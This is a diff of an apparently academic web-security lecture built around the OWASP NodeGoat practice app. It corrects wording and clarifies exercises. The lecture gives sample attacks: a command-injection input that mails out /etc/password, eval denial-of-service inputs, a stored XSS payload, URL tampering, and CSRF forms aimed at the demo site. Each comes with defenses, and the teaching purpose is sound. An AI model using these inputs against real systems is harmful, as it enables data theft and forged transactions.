@@ -48,7 +48,7 @@
 ## Learning goals
 
 - Describe the most common security issues in web applications.
-- Describe and implement number of attacks that can be executed against unsecured code.
+- Describe and implement a number of attacks that can be executed against unsecured code.
 - Implement measures to protect a web application against such attacks.
 
 ## Introduction
@@ -106,7 +106,7 @@ To showcase this threat we use a 2015 Steam store attack, which is extensively d
 
 ### Foot in the door
 
-The most difficult component of a system to secure are its users. Phishing and social engineering can lead unsuspecting users to give access to some part of the secured system to attackers - this is the foot in the from there. Once in, attackers try to infiltrate other internal systems.
+The most difficult component of a system to secure is its users. Phishing and social engineering can lead unsuspecting users to give access to some part of the secured system to attackers - this is the foot in the door from there. Once in, attackers try to infiltrate other internal systems.
 
 A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who knows whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is simply granted by the unsuspecting user, despite policies to the contrary.
 
@@ -120,7 +120,7 @@ An example here is [Instagram's backend admin panel](https://www.hackread.com/in
 
 In order to effectively secure a web application, it helps to know what the most frequent security issues are.
 
-Let's turn to the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (CSRHPE) to answer this question. For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. We here go over some of the most important findings concerning web applications.
+Let's turn to the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (CSRHPE) to answer this question. For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. Here, we go over some of the most important findings concerning web applications.
 
 The most important **software security issues** for web and mobile applications are the following, reported as *percentage of scanned applications*:
 
@@ -128,9 +128,9 @@ The most important **software security issues** for web and mobile applications 
 
 <sup>Figure taken from page 56, CSRHPE.</sup>
 
-:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the *security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The *environment* category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server mis-configurations, improper file settings, sample files and outdated software versions. The third category to mention is *Input validation and representation* which covers issues such as cross-site scripting (we cover this later in this lecture) and SQL injection (covered in a DB lecture), which is present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
+:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the *security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The *environment* category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is *Input validation and representation* which covers issues such as cross-site scripting (we cover this later in this lecture) and SQL injection (covered in a DB lecture), which is present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
 
-If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as *percentage of applications* and *median vulnerability count*:
+If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as the *percentage of applications* and *median vulnerability count*:
 
 ![Top 10 vulnerabilities](img/L8-security-report-2.png)
 
@@ -159,8 +159,8 @@ access point you're using is actually a hacker's laptop, and they're interceptin
 HTTP request and redirecting you to a clone of your bank's site instead of the real thing.
 Now your private data is exposed to the hacker.
 
-Strict Transport Security resolves this problem; as long as you've accessed your bank's web site
-once using HTTPS, and the bank's web site uses Strict Transport Security, your browser will know
+Strict Transport Security resolves this problem; as long as you've accessed your bank's website
+once using HTTPS, and the bank's website uses Strict Transport Security, your browser will know
 to automatically use only HTTPS, which prevents hackers from performing this
 sort of man-in-the-middle attack.
 ```
@@ -169,7 +169,7 @@ sort of man-in-the-middle attack.
 
 One of the best ways to learn about web security is to try out a few of the introduced techniques in an actual web application that is vulnerable. As we covered Node.js/Express, most useful to us is a vulnerable web application that was written in Node.js/Express.
 
-The [OWASP NodeGoat project](https://github.com/OWASP/NodeGoat) was designed specifically for this purpose. It provides an *"environment to learn how OWASP Top 10 security risks apply to web applications developed using Node.js"*. OWASP stands for [Open Web Application Security Project](https://www.owasp.org) and is an organization whose mission is to improve software security. Creating a vulnerable application to showcase the worst security issues, is one way to train software engineers in web security.
+The [OWASP NodeGoat project](https://github.com/OWASP/NodeGoat) was designed specifically for this purpose. It provides an *"environment to learn how OWASP Top 10 security risks apply to web applications developed using Node.js"*. OWASP stands for [Open Web Application Security Project](https://www.owasp.org) and is an organization whose mission is to improve software security. Creating a vulnerable application to showcase the worst security issues is one way to train software engineers in web security.
 
 The NodeGoat project implements an *Employee Retirement Savings Management* system called RetireEasy - we already saw a glimpse of it in the previous section.
 
@@ -195,10 +195,10 @@ Injection attacks on the server can take multiple forms, we first consider **OS 
 
 ![OS command injection](img/L8-os-command-injection.png)
 
-:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank yo for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
+:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
 
 - The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
-- An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two mails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly *unintended code execution.*.
+- An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly *unintended code execution.*.
 
 Web applications that do not validate their input are also attackable, if they interpret the user's input as JavaScript code snippet. Imagine a calculator web application that allows a client to provide a formula, that is then send to the server, executed with the result being sent back to the client. JavaScript offers an [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function that takes a string representing JavaScript code and runs it, e.g. the string `100*4+2` can be evaluated with `eval('100*4+2')`, resulting in `402`. However, a malicious user can also input `while(1)` or [`process.exit()`](https://nodejs.org/api/process.html#process_process_exit_code); the former leads the event loop to be stuck forever in the while loop, while the latter instructs Node.js to terminate the running process. Both of these malicious inputs constitute a denial of service attack.
 
@@ -242,12 +242,12 @@ An attacker can exploit broken authentication and session management functions t
 - **Storing a session ID in a cookie without informing the user**. A user may use a public computer to access a web application that requires authentication. Instead of logging out, the user simply closes the browser tab (this does NOT delete a session cookie!). An attacker uses the same browser and application a few minutes later - the original user will still be authenticated.
 - **Session ID are sent via HTTP** instead of HTTPS. In this case, an attacker can listen to the network traffic and simply read out the session ID. The attacker can then access the application without requiring the user's login/password.
 - **Session IDs are static instead of being rotated**. If session IDs are not regularly changed, they are more easily guessable.
-- **Session IDs are predictable.** Once an attacker gains knowledge of how to generate valid session IDs, the attacker can can wait for a user with valuable information to pass by.
+- **Session IDs are predictable.** Once an attacker gains knowledge of how to generate valid session IDs, the attacker can wait for a user with valuable information to pass by.
 
 #### :bangbang: NodeGoat
 
 1. Head to NodeGoat's installation at http://nodegoat.herokuapp.com/login. 
-2. Open the browser's dev tools, in particular the Storage Inspector that allows you to view the cookies stored by the client.
+2. Open the browser's dev tools. In particular, the Storage Inspector (under Application tab in Chrome) allows you to view the cookies stored by the client.
 3. Login with `user1` (user) and `User1_123` (password).
 4. Check the cookie value of `connect.sid`.
 5. Close the browser tab.
@@ -258,7 +258,7 @@ An attacker can exploit broken authentication and session management functions t
 #### How to avoid it
 
 - Good authentication and session management is difficult - avoid if possible an implementation from scratch.
-- Ensure that the session ID is **never send over the network unencrypted**.
+- Ensure that the session ID is **never sent over the network unencrypted**.
 - Session IDs should not be visible in URLs.
 - Generate a new session ID on login and **avoid reuse**.
 - Session IDs should have a timeout and be invalidated on the server after the user ends the session.
@@ -298,7 +298,7 @@ http://myforum.nl/search?q=<script>…
 1. Head to NodeGoat's installation at http://nodegoat.herokuapp.com/login. 
 2. Login with `user1` (user) and `User1_123` (password).
 3. Click *Profile* on the left-hand tab.
-4. In the *First Name* field, type `<script>alert("Hello there!")</script>`
+4. In the *First Name* field, type `<script>alert("Hello there!")</script>`. Also fill the *bank routing #* field with a random value since it is mandatory.
 5. Click *Submit*. You should now see an alert dialogue.
 6. Head to the top-right corner and check the profile by clicking on the *Profile* link. Again, the alert dialogue pops up as the code has been stored on the server. This is thus a stored XSS attack.
 
@@ -328,7 +328,7 @@ app.get('/todos/:type', function (req, res, next) {
 
 Here, we use the routing parameter `:type` as key of the `todoTypes` object. Often, applications do not verify whether a user requesting a particular route is authorized to access the target object. This leads to so-called *insecure direct object references*. A malicious user can test different routes to determine whether this issue exists.
 
-Consider a user who accesses her list of todos using the following URL `http://mytodos.nl/todos?id=234`. Nothing stops the user from also trying, e.g. `http://mytodos.nl/todos?id=2425353` or `http://mytodos.nl/todos?id=1`. If the id values are insecure direct object references, the user can view other users' todo lists in this manner.
+Consider a user who accesses her list of todos using the following URL `http://mytodos.nl/todos?id=234`. Nothing stops the user from also trying, e.g. `http://mytodos.nl/todos?id=2425353` or `http://mytodos.nl/todos?id=1`. If the id values are insecure direct object references, the user can view other users' to-do lists in this manner.
 
 #### :bangbang: NodeGoat
 
@@ -336,7 +336,7 @@ Consider a user who accesses her list of todos using the following URL `http://m
 2. Login with `user1` (user) and `User1_123` (password).
 3. Click *Allocations* on the left-hand tab.
 4. Check the URL, it should be http://nodegoat.herokuapp.com/allocations/2.
-5. Check the name of the *Asset Allocations*, it should be *boo*.
+5. Check the name of the *Asset Allocations*, it should be the *last name* you entered, e.g., *boo*.
 6. Now change the URL of step (4) by replacing the `/2` with `/3` or `/4`. You should now see the *Asset Allocations* of a different users, without requiring any login data.
 
 #### How to avoid it
@@ -399,7 +399,7 @@ Here is an example scenario: imagine a Web application that allows users to tran
 <img src="http://mygame.nl/transferFunds?amount=1000&to=666" width="0" height="0" />
 ```
 
-If the victim access the website that is under the attacker's control (e.g. because the attacker send the victim an enticing email to access the URL), the browser downloads the HTML, parses it and starts rendering. It will automatically download the image without checking whether the `src` is actually an image. The transfer of funds will then take place, if the web application, the user it authenticated to, does not defend against a CSRF attack (this occurs when the web application cannot distinguish between a forged and legitimate request).
+If the victim access the website that is under the attacker's control (e.g. because the attacker send the victim an enticing email to access the URL), the browser downloads the HTML, parses it and starts rendering. It will automatically download the image without checking whether the `src` is actually an image. The transfer of funds will then take place if the web application the user is authenticated to does not defend against a CSRF attack (This occurs when the web application cannot distinguish between a forged and legitimate request).
 
 #### :bangbang: NodeGoat
 
@@ -414,13 +414,13 @@ If the victim access the website that is under the attacker's control (e.g. beca
     <head>
     </head>
     <body>
-    	<form method="POST" action="http://nodegoat.herokuapp.com/profile">
-    		<h1> You are about to win a brand new phone!</h1>
-    		<h2> Click on the win button to claim it...</h2>
-    		<input type="hidden" name="bankAcc" value="2"/>
-    		<input type="hidden" name="bankRouting" value="2#"/>
+        <form method="POST" action="http://nodegoat.herokuapp.com/profile">
+            <h1> You are about to win a brand new phone!</h1>
+            <h2> Click on the win button to claim it...</h2>
+            <input type="hidden" name="bankAcc" value="2"/>
+            <input type="hidden" name="bankRouting" value="2#"/>
             <input type="submit" value="Win !!!"/>
-    	</form>
+        </form>
     </body>
 </html>
 ```
@@ -438,7 +438,7 @@ How can the server validate that this request was intentionally sent by the user
 
 As CSRF tokens are an established line of defense, Express middleware exists (a popular option is [csurf](https://www.npmjs.com/package/csurf)) that takes care of the generation and validation of CSRF tokens.
 
-Another option for a web application to verify that a user intended a particular request are the use of reauthentication (the user is asked to authenticate again, e.g. if the request takes place at an usual time, at an unusual location) and (re)CAPTCHA mechanisms:
+Another option for a web application to verify that a user intended a particular request are the use of reauthentication (the user is asked to authenticate again, e.g., if the request takes place at an unusual time, or at an unusual location) and (re)CAPTCHA mechanisms:
 
 ![Captcha](img/L8-captcha.png)
 
@@ -497,7 +497,7 @@ Here are a few questions you should be able to answer after having followed the 
 
 7. Which of the following approaches is not suitable for an attacker to attempt the injection of malicious data into a server-side application?
     - URL parameter manipulation
-    - Hidden HTML field manipulation
+    - Hidden HTML field manipulation
     - Cookie manipulation
   
 8. What does a signed cookie protect against?
